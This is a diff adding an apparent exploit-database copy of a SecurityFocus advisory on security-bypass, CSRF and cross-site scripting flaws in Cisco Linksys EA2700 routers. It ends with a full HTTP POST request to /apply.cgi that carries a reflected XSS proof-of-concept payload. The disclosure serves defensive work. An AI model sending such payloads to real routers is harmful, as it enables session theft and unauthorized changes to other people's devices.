@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/59054/info
+
+Cisco Linksys EA2700 routers is prone to the following security vulnerabilities:
+
+1. A security-bypass vulnerability
+2. A cross-site request-forgery vulnerability
+3. A cross-site scripting vulnerability
+
+An attacker can exploit these issues to bypass certain security restrictions, steal cookie-based authentication credentials, gain access to system and other configuration files, or perform unauthorized actions in the context of a user session.
+
+Cisco Linksys EA2700 running firmware 1.0.12.128947 is vulnerable. 
+
+The following example request is available:
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+submit_button=xss'%3balert(1)//934&action=Apply 
